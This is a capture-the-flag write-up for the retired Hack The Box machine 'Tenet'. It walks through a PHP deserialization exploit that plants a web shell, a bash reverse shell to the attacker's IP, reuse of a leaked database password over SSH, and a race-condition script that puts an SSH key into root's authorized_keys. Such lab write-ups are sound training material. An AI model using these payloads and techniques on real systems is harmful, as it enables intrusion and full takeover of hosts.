# Tenet

This is the write-up for the box Tenet that got retired at the 12th June 2021.
My IP address was 10.10.14.4 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.223    tenet.htb
```

## Enumeration

Starting with a Nmap scan:

```
nmap -sC -sV -o nmap/tenet.nmap 10.10.10.223
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)
|   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)
|_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Checking HTTP (Port 80)

The website shows the _Apache2 Ubuntu Default Page_.
Lets search for hidden directories with **Gobuster**:
```
gobuster -u http://10.10.10.223 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

It finds the directory _wordpress_ which is a **WordPress** blog with two articles.
It automatically forwards to _tenet.htb_ when having the hostname in the _/etc/hosts_ file.

One article is written by the user _protagonist_ and seems to have some hints about a time-management service:
```
We're looking for beta testers of our new time-management software, 'Rotas'

'Rotas' will hopefully be coming to market late 2021, pending rigorous QA from our developers, and you!

For more information regarding opting-in, watch this space.
```

Another article with the title _"Migration"_ has a comment from the user _neil_:
```
did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!
```

The file _sator.php_ can be found on the web server on 10.10.10.223 but it has no valuable information:
```
[+] Grabbing users from text file
[] Database updated
```

Backup files often have the extension of _.bak_ and by trying that, the _sator.php.bak_ can be found there, too.
It has PHP code and uses a _destruct function_ with the _file_put_contents_ function and is vulnerable to **PHP Deserialization**.

Creating a serialized object that uploads _shell.php_ to execute system commands:
```php
class DatabaseExport
{
        public $user_file = 'shell.php';
        public $data = '<?php system($_REQUEST["cmd"]); ?>';
}

$pwn = new DatabaseExport;
echo (serialize($pwn));
```
```
O:14:"DatabaseExport":2:{s:9:"user_file";s:9:"shell.php";s:4:"data";s:34:"<?php system($_REQUEST["cmd"]); ?>";}
```

Sending the serialized object to the parameter _arepo_:
```
http://10.10.10.223/sator.php?arepo=O:14:%22DatabaseExport%22:2:{s:9:%22user_file%22;s:9:%22shell.php%22;s:4:%22data%22;s:34:%22%3C?php%20system($_REQUEST[%22cmd%22]);%20?%3E%22;}
```

Testing command execution:
```
curl 10.10.10.223/shell.php?cmd=id
```

It works and shows the output of the `id` command.
Starting a reverse shell:
```
POST /shell.php HTTP/1.1
Host: 10.10.10.223

cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.4/9001 0>&1'
```

After URL-encoding the command and sending the request, the listener on my IP and port 9001 starts a reverse shell as _www-data_.

## Privilege Escalation

The configuration file _/var/www/html/wordpress/wp-config.php_ has credentials for a database user:
```
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );  

/** MySQL database username */                                                                    
define( 'DB_USER', 'neil' );                                                                      

/** MySQL database password */
define( 'DB_PASSWORD', 'Opera2112' );
```

Trying the credentials for the user _neil_ on SSH:
```
ssh neil@10.10.10.22
```

It works a escalates the privileges to _neil_.

### Privilege Escalation to root

The user _neil_ can run _enableSSH.sh_ with root privileges:
```
sudo -l

User neil may run the following commands on tenet:
    (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh
```

It is a bash script and puts an SSH key to _/root/.ssh/authorized_keys_.
The function _addKey()_ creates a temporary file in _/tmp_ and checks if it exists.

This script is vulnerable to a **Race Condition** by replacing the contents of the written file to _/tmp_ before it gets checked, we could add our own SSH key into _authorized_keys_.

Creating an SSH key on our local client:
```
ssh-keygen -f tenet.key
```

Creating a script in _/tmp_ that writes the created public key into any created file that starts with _"ssh"_:
```bash
while true; do
        for file in $(ls); do
                if [[ $file == ssh* ]]; then
                        echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDd7S9(...)" > $file;
                fi
        done
done
```

Executing the script:
```
bash brute_tenet.sh
```

While the script runs in a loop, the _enableSSH.sh_ script has to be executed several times:
```
sudo /usr/local/bin/enableSSH.sh
```

If it works and overwrites the SSH key with our key, it will be possible to SSH into the box as root!
```
ssh -i tenet.key 10.10.10.223
```
